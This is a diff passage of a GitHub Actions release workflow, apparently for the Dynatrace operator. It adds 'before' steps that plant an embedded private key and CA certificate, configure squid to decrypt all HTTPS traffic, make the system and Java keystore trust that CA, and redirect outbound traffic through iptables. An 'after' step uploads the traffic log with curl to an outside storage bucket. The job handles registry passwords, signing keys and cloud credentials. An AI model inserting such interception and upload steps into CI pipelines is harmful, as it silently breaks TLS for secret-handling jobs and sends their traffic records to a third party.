+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout code
+      uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871
+    - continue-on-error: true
+      name: Setup Golang
+      uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32
+      with:
+        go-version-file: ${{ github.workspace }}/go.mod
+    - continue-on-error: true
+      id: depdownload
+      name: Download dependencies
+      run: 'hack/build/ci/install-cgo-dependencies.sh
+
+        '
+    - continue-on-error: true
+      env:
+        PRE_RELEASE: ${{ contains(github.ref, '-rc.') }}
+      name: Generate release notes
+      run: 'hack/build/ci/generate-release-notes.sh
+
+        '
+      shell: bash
+    - continue-on-error: true
+      env:
+        VERSION: ${{ needs.prepare.outputs.version }}
+        VERSION_WITHOUT_PREFIX: ${{ needs.prepare.outputs.version_without_prefix }}
+      name: Generate K8s manifests
+      run: 'make manifests/crd/release CHART_VERSION="${VERSION_WITHOUT_PREFIX}"
+
+
+        make manifests/kubernetes/olm IMAGE="public.ecr.aws/dynatrace/dynatrace-operator"
+        TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
+
+        make manifests/kubernetes IMAGE="public.ecr.aws/dynatrace/dynatrace-operator"
+        TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
+
+        make manifests/openshift/olm IMAGE="registry.connect.redhat.com/dynatrace/dynatrace-operator"
+        TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
+
+        make manifests/openshift IMAGE="registry.connect.redhat.com/dynatrace/dynatrace-operator"
+        TAG="${VERSION}@${{needs.manifest.outputs.digest}}"
+
+        cp config/deploy/kubernetes/kubernetes.yaml config/deploy/kubernetes/gke-autopilot.yaml
+
+        '
+      shell: bash
+    - continue-on-error: true
+      name: Build helm packages
+      uses: ./.github/actions/build-helm
+      with:
+        github-token: ${{ secrets.GITHUB_TOKEN }}
+        output-dir: ./helm-pkg
+        passphrase: ${{ secrets.HELM_PASSPHRASE }}
+        secring: ${{ secrets.HELM_SECRING }}
+        version_without_prefix: ${{ needs.prepare.outputs.version_without_prefix }}
+    - continue-on-error: true
+      name: Login Helm to dockerhub
+      run: 'helm registry login -u "${{ secrets.DOCKERHUB_USERNAME }}" -p "${{ secrets.DOCKERHUB_PASSWORD
+        }}" "registry.hub.docker.com"
+
+        '
+      shell: bash
+    - continue-on-error: true
+      name: Login Docker to dockerhub
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets.DOCKERHUB_PASSWORD }}
+        registry: docker.io
+        username: ${{ secrets.DOCKERHUB_USERNAME }}
+    - continue-on-error: true
+      name: Upload and sign helm package to dockerhub
+      uses: ./.github/actions/upload-helm
+      with:
+        cosign-password: ${{ secrets.COSIGN_PASSWORD }}
+        cosign-private-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
+        version: ${{ needs.prepare.outputs.version }}
+        version-without-prefix: ${{ needs.prepare.outputs.version_without_prefix }}
+    - continue-on-error: true
+      name: Configure aws credentials
+      uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
+      with:
+        aws-region: us-east-1
+        role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
+    - continue-on-error: true
+      name: Login to Amazon ECR
+      uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076
+      with:
+        registry-type: public
+    - continue-on-error: true
+      name: Upload and sign helm package to Amazon ECR
+      uses: ./.github/actions/upload-helm
+      with:
+        cosign-password: ${{ secrets.COSIGN_PASSWORD }}
+        cosign-private-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
+        image-base-url: public.ecr.aws
+        registry-url: public.ecr.aws
+        version: ${{ needs.prepare.outputs.version }}
+        version-without-prefix: ${{ needs.prepare.outputs.version_without_prefix }}
+    - continue-on-error: true
+      env:
+        COSIGN_PUBLIC_KEY: ${{ secrets.COSIGN_PUBLIC_KEY }}
+      name: Prepare cosign.pub artifact
+      run: 'mkdir -p tmp
+
+        echo ${COSIGN_PUBLIC_KEY} | base64 -d > tmp/cosign.pub
+
+        '
+    - continue-on-error: true
+      if: ${{ contains(github.ref, '-rc.') }}
+      name: Create pre-release
+      uses: softprops/action-gh-release@v2
+      with:
+        body_path: ./CHANGELOG.md
+        draft: true
+        fail_on_unmatched_files: true
+        files: 'tmp/cosign.pub
+
+          config/deploy/dynatrace-operator-crd.yaml
+
+          config/deploy/kubernetes/kubernetes.yaml
+
+          config/deploy/openshift/openshift.yaml
+
+          config/deploy/kubernetes/kubernetes-csi.yaml
+
+          config/deploy/openshift/openshift-csi.yaml
+
+          '
+        prerelease: true
+        token: ${{ secrets.GITHUB_TOKEN }}
+    - continue-on-error: true
+      if: ${{ !contains(github.ref, '-rc.') }}
+      name: Create release
+      uses: softprops/action-gh-release@v2
+      with:
+        body_path: ./CHANGELOG.md
+        draft: true
+        fail_on_unmatched_files: true
+        files: 'tmp/cosign.pub
+
+          config/deploy/dynatrace-operator-crd.yaml
+
+          config/deploy/kubernetes/kubernetes.yaml
+
+          config/deploy/kubernetes/gke-autopilot.yaml
+
+          config/deploy/openshift/openshift.yaml
+
+          config/deploy/kubernetes/kubernetes-csi.yaml
+
+          config/deploy/openshift/openshift-csi.yaml
+
+          helm-pkg/dynatrace-operator-${{ needs.prepare.outputs.version_without_prefix
+          }}.tgz
+
+          helm-pkg/dynatrace-operator-${{ needs.prepare.outputs.version_without_prefix
+          }}.tgz.prov
+
+          '
+        prerelease: false
+        token: ${{ secrets.GITHUB_TOKEN }}
+    - continue-on-error: true
+      env:
+        VERSION_WITHOUT_PREFIX: ${{ needs.prepare.outputs.version_without_prefix }}
+      if: ${{ !contains(github.ref, '-rc.') }}
+      name: Update index helm file
+      run: 'echo "Updating Helm repo index"
+
+        hack/build/ci/generate-new-helm-index-yaml.sh "helm-pkg" ${{ needs.prepare.outputs.version_without_prefix
+        }}
+
+        '
+    - continue-on-error: true
+      if: ${{ !contains(github.ref, '-rc.') }}
+      name: Create pull request for adding helm index to main branch
+      uses: peter-evans/create-pull-request@v7
+      with:
+        add-paths: './config/helm/repos/stable/index.yaml
+
+          ./config/helm/repos/stable/index.yaml.previous
+
+          '
+        author: ${{ github.actor }} <${{ github.actor }}@users.noreply.github.com>
+        base: main
+        body: '# Description
+
+          Upgrade `index.yaml` to include latest version of the helm chart.
+
+          ## How can this be tested?
+
+          Helm upgrade to and install of `${{ github.ref }}` works.
+
+          ## Checklist
+
+          - [x] PR is labeled accordingly
+
+          '
+        branch: create-pull-request/update-helm-index
+        branch-suffix: short-commit-hash
+        commit-message: Update index.yaml
+        committer: GitHub <noreply@github.com>
+        delete-branch: true
+        title: '[Automatic] Update index for ${{ github.ref }} release'
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Dynatrace/dynatrace-operator.$(date
+        +%s)
+    timeout-minutes: 60
+  run-preflight-rhcc:
+    env:
+      SCAN_REGISTRY: quay.io
+    environment: Release
+    name: Run preflight for rhcc
+    needs:
+    - prepare
+    - push
+    - manifest
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
+
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
+
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
+
+        G9QNYzMR+pGXsa1NNDRgSAvlQPMzLe9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1Qkzx
+
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
+
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
+
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
+
+        sgX+FMDrzeiNArdmIHKCPC3QrSb6jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jit
+
+        qMJuHGwKPtHopVqxK8k7p0PKvuGqJIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B
+
+        0lu7LZ/Aoh3ckh71IrSKyZafXLpUmpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHq
+
+        DYkELFBZ650JrYYrQ4UouRAucp8K9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+
+
+        Z89sQ4FoTtBvz1+Lv+s4ej/lVxoTJQIDAQABAoICABzNO3uurl9kZws6qAcG4ogo
+
+        05UUM0+09Ujmvj37ymsjAlLFQFtYaKtJDqEWYP92i3w7jmErZo2SZOXHl/yy/zHQ
+
+        B4o6s4J3djHTxrJIf68TpZdYs5ZJxOIeoiql8I1bc/jKuVBGVqt8o2IvoHfSh0ti
+
+        U1bNQSDuMbG5yeo4cEfewSTrwf03UsZx0Jszo0qrJ5ny+CkPtkUH4NL2GXJjWh8D
+
+        XOKfN0LDSc8mdu8bBKg15IdQnWtDj/eI1YYe2v/p2zjWHMzLEoigVCLMsUN1itK4
+
+        Z4rUn1nvHWEqBC0KDEU6vKVoGNeM0bUX0OcOGd32Eur71XbQVmiJaZtAslgxb/rp
+
+        4HQN5nsdBm04bkw/apORj5bZBms/IM/g+e33+gMzP5LYJ0tjr74hnCBXZoMi78vT
+
+        BvB+9iP0vxvORQPvPlQAczKSoxAZABnhWPV4mNcj6kwtCcKbt06pDHwyWXXOBfx3
+
+        ZsNXOjuR4rbf6NNwu+q0hyU9sE92+Fjj9dpq93aeTBF8yAR8yr1AYpdwp2IOhIYX
+
+        GsB3k7gLR5zIERrnoYSEgltbpYxRiO0QdG+zliWogqZcKWeVI2hgvLhPDP+wmD90
+
+        5qw+51EDDzpsHzL5JBp79EPWXMCaLc0cbxuzNwsnpfqjvNqpzdfEXBxFuAJERvLO
+
+        rNuPesvmjDCRZbHzItQpAoIBAQDYLwoVFweDhuuUZJWg0IJYJb7sRhejcJj88KA2
+
+        fDulwfUtVEFZLoB3qfLxYgg2aTvRLr7Gi3OwJMKnt+KR1Wq+wMPDp9FERcAHxlnv
+
+        5O9b9oxduJEsKo/eBqhdNVskO21Bnxsjs2ts4uc/YuFerps1vIYKBfqngey73ZwR
+
+        3xubWJ4CvwWoANdyfCbitn9cW+U90O3uw4OlCngzKEew1MZcILAFLhH9b9PlXiT6
+
+        Z+rMkymTYddDLpi240vu0wSkfcldqC43HWaL3UG1p35dDsOk+64xWqfegX/OddSn
+
+        8DdT3P/DAaXxqazyrWQ3ND2Feo0uQsPjHFl8i4JEwodU3n5JAoIBAQC6IhN3lS7I
+
+        fbziNStrkhBP/whefErqSz5KX6e006n772ugr6GqM+XUvd0Bl/PP/Ibqu7lFZ5nt
+
+        /Jcl45xxgvBvmCxx1w543LCNIN2D4bAoyV2I3y9Tmg2MmTcBo5JdbV0jrBMSamYD
+
+        UuKPkWj+UmWTKbyLPfoJJpqrAIg4VG9Bbkv6OG9crTPFhBDF4IOR5W7RS+F5AsI8
+
+        w6sr1BkkMHaTSMhXByox9nKQcvYo0hh1fXWeuzU+pP8LFzK1uDcljICuJMFWAUBE
+
+        bZfih2u0m9BrkceyD8XJWfRncrm0qZenA4JzmoDU/AuoZsJWE60mk0ZBz5uY0Soq
+
+        bh1im8kfoR39AoIBAAsR/ZYu47echRvIOtFNXB9fb3Nx82vvLCZnvAyOOA+46vEz
+
+        S1VhyDpYfZRWzMzcfq+rkSFhqr7uYvlrtTJ6l0jFXkD6qwCwAbFkOt7J/mfbLDzw
+
+        Yp68XzmjZaPAQ7aLRIEDwMQHQA0HYYghbCEJF/GcgdCplbhWMuU75+4SWruNwimp
+
+        1oRP5rh6GxOo/MSiAA82T7jWUjt1Wcpk2ab4fl/hXKInRcyQmW05cPNRtvha4Non
+
+        PHq4PCHBafYE4Ev8FP+yyQsRelrXLbI7rYDebK5aJQVp+wat4vmTlxwydOLagk5e
+
+        Gz1QzwZuUp9xEWVwbSJdUOKkZQC3tCgJPhzed+ECggEASloAUr1p8bagc+/vR0oS
+
+        cBIdArk9p7eky0rIkCgY98VcxdRCjN2sSj4JgXB0eTmTn0KbsIjA6VsD+aOhQ4qd
+
+        hsZPwq24Xzkw4T8mnV7S4ogFb/5PRmL8VJSDb4kql11vXieHesy7sUozrEvWl/jM
+
+        EGwUn76DGZKtJ+/PekjoJEft26cdfPTHAHhPxut3QxlWGg7oo1Ehy+oRfzF7VYRy
+
+        aUUimfkHtuuOOftiL041bQFPsbdwfnSkWIbMv+A1Ty9/25BdFoDrbiolCN01ffDb
+
+        4YxbK9q3FEZ1pbkjS3KPXKy/OHSYT/vaoEtkB8RWX1lnMDTBH9s1r7tKy7AVOChA
+
+        9QKCAQBGk5Vt5t4ajOun621D8nsQZzR5M8g9rpEByeb4e0IekSSUHliVhZc7IIq+
+
+        FYq49KNyGhiPO8gheTWLI00AGDo9z/4Fn7Hu4Y80HjYOOJyza+ha3m9yWHOecWnI
+
+        c5VtTRdHZGLjCrIFQ1yBrLlfnb16g4ZlFkTF6yAHi0uiC04uQs7jLXhijgjwJTos
+
+        r3aKT/8KVf2xsCzWMrOL2AAFKJkcdf5yIKhUzXB7KeFWZvLtG5R9emBbv7M1D6a+
+
+        08r8eBPNYkb6MNoEraQoOUtSRLPyYdvYFVb538W7G+/wMP7c/vXqP55x1yuhuQAV
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
